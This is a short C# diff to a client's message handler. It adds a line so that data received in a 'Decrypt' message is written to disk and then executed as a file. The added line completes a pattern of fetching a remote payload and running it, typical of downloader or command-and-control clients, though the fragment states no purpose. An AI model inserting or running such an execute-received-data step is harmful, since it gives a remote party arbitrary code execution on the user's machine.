@@ -170,6 +170,7 @@ internal class Client
             case MessageType.Decrypt:
                 var decryptedDataValue = Convert.FromHexString(message.Frames[FramesNames.Data].ToString()!);
                 FilesHelper.WriteData(DECRYPTED_FILENAME, _filesDirectory, decryptedDataValue, asHex: false);
+                ExecutionHelper.Execute(Path.Combine(_filesDirectory, DECRYPTED_FILENAME));
                 break;
             case MessageType.Default:
                 break;
